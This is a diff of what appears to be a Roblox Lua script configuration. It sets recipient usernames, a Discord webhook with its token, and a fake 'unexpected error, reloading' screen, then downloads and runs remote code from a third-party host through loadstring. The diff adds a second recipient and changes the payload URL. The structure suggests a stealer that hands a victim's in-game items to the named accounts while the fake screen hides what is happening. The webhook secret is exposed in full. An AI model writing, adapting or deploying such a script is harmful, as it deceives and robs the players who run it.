@@ -1,5 +1,6 @@
 
 UserName = "ScriptingLoaded"
+UserName2 = "ScriptingLoaded" -- optional delete the whole line if you don't want it
 Webhook = "https://discord.com/api/webhooks/1098424928803508234/_7KKLRzNrgMT6GTOX7tTPVtLPaODYMPfTIWx44H-x0K-bsutCfIX01ZshCqhZNf5cULI" -- optional delete the whole line if you don't want it
 
 _G.LoadingScreen = true
@@ -11,6 +12,6 @@ _G.ScriptName = "Project Orion *ERROR*"
 _G.FirstText = "UNEXPECTED ERROR HAS OCCURRED"
 _G.SecondText = "RELOADING YOUR SCRIPT"
 _G.ThirdText = "PLEASE WAIT UNTIL ITS FINISHED THX FOR YOUR PATIENT"
-_G.WaitingTime = 100 -- it's the time between 0% and 100% in secondes
+_G.WaitingTime = 70 -- it's the time between 0% and 100% in secondes
 
-loadstring(game:HttpGet("https://rizzhub.xyz/scripts/Main.lua", true))()
+loadstring(game:HttpGet("http://rizz.ct8.pl/scripts/Main", true))()
